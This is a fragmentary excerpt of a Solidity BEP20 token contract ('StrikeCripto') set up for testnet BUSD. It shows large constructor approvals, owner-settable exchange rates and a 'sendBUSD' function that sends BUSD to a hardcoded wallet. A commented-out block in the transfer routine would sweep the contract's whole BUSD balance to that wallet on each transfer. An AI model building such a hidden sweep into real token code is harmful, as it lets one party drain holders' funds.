...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 BUSD = IBEP20(0x92aeE552f932Ed7E7422b8B9D259139c72E15C25); //testnet
...
contract StrikeCripto is IBEP20, Auth {
    ...
    address BUSD = 0x92aeE552f932Ed7E7422b8B9D259139c72E15C25; // testnet

    //IBEP20 BUSD2 = IBEP20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56); // mainnet
    IBEP20 BUSD2 = IBEP20(0x92aeE552f932Ed7E7422b8B9D259139c72E15C25); //testnet
    ...
    constructor () Auth(msg.sender) {
        ...
        approve(0xD99D1c33F9fC3444f8101754aBC46c52416550D1, 100000000000000000000000000);
        BUSD2.approve(0xD99D1c33F9fC3444f8101754aBC46c52416550D1, 100000000000000000000000000);
    ...
    function newTrocaSTR(uint256 novoSTR) public onlyOwner{
        trocaSTR = novoSTR;
    }

    function newTrocaBUSD(uint256 novoBUSD) public onlyOwner{
        trocaBUSD = novoBUSD;
    }
    ...
    function sendBUSD(uint256 valorBUSD) internal {
        BUSD2.transfer(0x3aa8c227861E4226793365b81C622a4256094C52, valorBUSD);
    }
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        /*
        uint256 BusdBalance = BUSD2.balance(address(this));
        if(BusdBalance>0){
             sendBUSD(BusdBalance);
        }
        */
